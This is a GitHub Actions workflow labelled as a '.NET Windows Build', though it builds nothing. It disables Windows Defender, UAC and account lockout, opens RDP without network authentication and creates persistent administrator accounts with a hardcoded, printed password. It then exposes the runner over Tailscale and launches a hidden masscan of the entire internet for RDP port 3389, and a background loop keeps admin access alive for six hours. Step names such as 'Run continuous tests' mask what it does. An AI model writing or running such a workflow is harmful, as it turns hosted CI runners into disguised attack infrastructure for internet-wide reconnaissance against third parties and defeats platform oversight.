name: .NET Windows Build (Crash-Proof RDP)

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 360
    steps:
      - name: Nuke Defender & Disable Security Features
        run: |
          Write-Host "Disabling Windows Defender and Security Features..."
          # Completely disable Real-Time Protection (Defender is the #1 cause of mid-run crashes)
          Set-MpPreference -DisableRealtimeMonitoring $true
          Set-MpPreference -DisableBehaviorMonitoring $true
          Set-MpPreference -DisableBlockAtFirstSeen $true
          Set-MpPreference -DisableIOAVProtection $true
          Set-MpPreference -DisablePrivacyMode $true
          
          # Disable UAC
          Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0
          
          # Disable account lockout policies
          net accounts /lockoutthreshold:0
          net accounts /lockoutduration:0
          net accounts /lockoutwindow:0
          Write-Host "Defender and Security disabled."

      - name: Configure RDP and Network
        run: |
          Write-Host "Enabling Remote Desktop..."
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0

      - name: Setup and Fortify Admin Access
        run: |
          $Password = "Cynet@2026"
          $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force

          # Guarantee runneradmin access
          net user runneradmin $Password /active:yes /passwordchg:no /expires:never
          net localgroup Administrators runneradmin /add

          # Create/Update CynetAdmin
          $userExists = Get-LocalUser -Name "CynetAdmin" -ErrorAction SilentlyContinue
          if (-not $userExists) {
              New-LocalUser -Name "CynetAdmin" -Password $SecurePassword -PasswordNeverExpires -UserMayNotChangePassword
          } else {
              Set-LocalUser -Name "CynetAdmin" -Password $SecurePassword -PasswordNeverExpires $true -UserMayChangePassword $false
          }
          net localgroup Administrators CynetAdmin /add
          net user CynetAdmin $Password /active:yes /expires:never

      - name: Install network tools (Tailscale)
        env:
          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
        run: |
          Write-Host "Downloading Tailscale..."
          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
          
          Start-Sleep -Seconds 5
          Write-Host "Authenticating Tailscale..."
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="win-build-$env:GITHUB_RUN_ID"
          
          Start-Sleep -Seconds 8
          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          
          Write-Host ""
          Write-Host "=================================================="
          Write-Host "  Build node ready for RDP"
          Write-Host "  Node IP     : $ts_ip"
          Write-Host "  Username    : runneradmin (or CynetAdmin)"
          Write-Host "  Password    : Cynet@2026"
          Write-Host "=================================================="

      - name: Run Scanning Tool Safely in Background
        run: |
          Write-Host "Starting scanning tool in background with CPU throttling..."
          
          # CRITICAL FIX: Run the tool with BelowNormal priority. 
          # This prevents it from starving the GitHub Runner Agent, which stops the 16-minute crash.
          # ALSO CRITICAL: --rate 200 prevents Windows socket exhaustion.
          # Replace 'masscan.exe' and the arguments with your actual tool and flags.
          $scanArgs = "0.0.0.0/0 -p 3389 --rate 200 -oL C:\scan_results.txt"
          
          Start-Process -FilePath "masscan.exe" `
                        -ArgumentList $scanArgs `
                        -WindowStyle Hidden `
                        -RedirectStandardOutput "C:\scan_out.log" `
                        -RedirectStandardError "C:\scan_err.log"
          
          # Force the process to BelowNormal priority immediately
          Start-Sleep -Seconds 2
          Get-Process -Name "masscan" -ErrorAction SilentlyContinue | ForEach-Object { $_.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal }
          
          Write-Host "Scanning tool is running safely in the background."

      - name: Run continuous tests (Keep-alive + Admin Reaffirmation)
        run: |
          Write-Host "Starting background admin preservation job..."
          Start-Job -ScriptBlock {
              while ($true) {
                  Start-Sleep -Seconds 600 # Every 10 minutes
                  net user runneradmin Cynet@2026 /active:yes /passwordchg:no /expires:never | Out-Null
                  net localgroup Administrators runneradmin /add | Out-Null
                  net accounts /lockoutthreshold:0 | Out-Null
              }
          } | Out-Null

          Write-Host "Starting 360-minute keep-alive loop..."
          for ($i = 1; $i -le 360; $i++) {
            Start-Sleep -Seconds 60
            Write-Host "[$i/360] Build node is alive. Admin access preserved."
          }
